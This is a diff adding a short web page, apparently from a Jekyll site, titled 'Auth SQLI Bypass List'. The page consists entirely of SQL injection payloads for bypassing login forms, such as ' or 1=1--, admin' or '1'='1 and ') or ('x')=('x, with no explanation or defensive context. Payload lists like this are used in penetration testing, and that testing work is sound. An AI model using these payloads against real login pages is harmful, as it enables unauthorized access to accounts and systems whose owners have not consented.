@@ -1,1 +1,43 @@
+---
+title: /_posts
+layout: page
+permalink: /_posts
+---
 
+# Auth SQLI Bypass List
+
+<pre>
+  '="or'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or 1=1 limit 1 -- -+ 
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true-- 
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
+') or ('x')=('x
+")) or (("x"))=(("x
+1=1 or 1=1--
+or 1=1#
+or 1=1/*
+admin' --
+admin''--
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+</pre>
